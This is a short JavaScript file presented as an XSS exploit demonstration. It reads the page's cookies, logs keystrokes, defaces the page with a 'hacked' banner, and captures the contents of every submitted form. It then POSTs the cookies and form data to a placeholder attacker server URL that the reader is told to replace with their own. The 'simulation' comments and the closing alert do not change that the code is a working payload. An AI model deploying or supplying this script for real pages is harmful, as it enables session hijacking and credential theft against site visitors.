// Simulate cookie theft
const cookies = document.cookie;
console.log('Stolen Cookies:', cookies);

// Capture keystrokes (keylogger simulation)
document.addEventListener('keypress', (e) => {
  const key = String.fromCharCode(e.keyCode);
  console.log('Key pressed:', key);
});

// Deface the webpage (visible demonstration)
document.body.innerHTML += `
  <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:10px;z-index:9999;">
    XSS EXPLOIT DEMO: This page is hacked!
  </div>
`;

// Exfiltrate data to a mock attacker server (replace URL with your test endpoint)
const exfiltrateData = async (data) => {
  const attackerServer = 'https://your-test-server.com/log'; // Replace with your test URL
  try {
    await fetch(attackerServer, {
      method: 'POST',
      body: JSON.stringify({ cookies, data }),
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (err) {
    console.error('Exfiltration failed:', err);
  }
};

// Steal form data (simulate phishing)
const forms = document.querySelectorAll('form');
forms.forEach(form => {
  form.addEventListener('submit', (e) => {
    const formData = new FormData(form);
    const entries = Object.fromEntries(formData.entries());
    exfiltrateData(entries);
  });
});

// Print a harmless message to the user
alert('XSS DEMO: This is a test. No real attack occurred.');
